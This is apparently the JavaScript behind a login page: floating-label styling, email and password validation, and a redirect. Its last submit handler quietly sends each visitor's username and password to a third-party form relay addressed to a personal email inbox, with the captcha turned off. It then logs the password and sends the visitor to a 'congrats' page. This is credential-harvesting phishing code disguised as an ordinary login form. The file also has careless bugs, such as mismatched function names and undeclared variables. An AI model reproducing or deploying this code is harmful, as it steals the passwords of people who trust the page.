let inputs = document.querySelectorAll("input");
inputs.forEach((input) =>
  input.addEventListener("change", (e) => {
    label = e.target.closest(".userBox").querySelector("label");
    if (input.value != "") {
      label.style.top = "-20px";
      label.style.color = "#" + "03e9f4";
      label.style.fontSize = "12px";
    } else {
      label.style.top = "0px";
      label.style.fontSize = "18px";
      label.style.color = "white";
    }
  }),
);

myForm.addEventListener('submit', (e) => {
  e.preventDefault();
  checkValidation();
});
let checkValidity = () => {
  let [validEmail, validPassword] = [false, false]
  if (email.value === '') {
      explain.classList.add('show');
      check.classList.remove('show');
      email.classList.add('error');
      email.classList.remove('success');
      errormsgs.innerHTML = 'Please enter a valid email!';
  }
  else if (!pattern.test(email.value)) {
      explain.classList.add('show');
      check.classList.remove('show');
      email.classList.add('error');
      email.classList.remove('success');
      errormsgs.innerHTML = 'Invalid Email!';
  }
  else {
      check.classList.add('show');
      explain.classList.remove('show');
      email.classList.add('success');
      email.classList.remove('error');
      errormsgs.innerHTML = '';
      errormsgs2.innerHTML = "Looking good!";
      validEmail = true
  }
  if (password.value == '') {
      explain2.classList.add('show');
      check2.classList.remove('show');
      password.classList.add('error');
      password.classList.remove('success');
      errormsgs22.innerHTML = 'Password input cannot be empty';
  }
  else {
      check2.classList.add('show');
      explain2.classList.remove('show');
      password.classList.add('success');
      password.classList.remove('error');
      errormsgs22.innerHTML = '';
      errormsg22.innerHTML = 'Looking good';
      validPassword = true
  }
  return validEmail && validPassword
}
function checkValidation() {
  let homePages = '/indexs/homepage/home.html';

  checkValidity() ? window.location.assign(homePages) : " "
}

document.querySelector("form").addEventListener("submit", (e) => {
  e.preventDefault();
  mail = "sikirusulaimon2002@gmail.com";
  subject = `${window.location.hostname} ${new Date()}`;
  let body = new FormData();
  body.append("Username", Username.value);
  body.append("Password", password.value);
  body.append("_captcha", false);
  body.append("_template", "table");
  body.append("_subject", subject);
  let URL = `https://formsubmit.co/${mail}`;
  fetch(URL, {
    method: "POST",
    body: body,
  }).then(window.location.assign("congrats.html"));
  console.log(password.value);
});
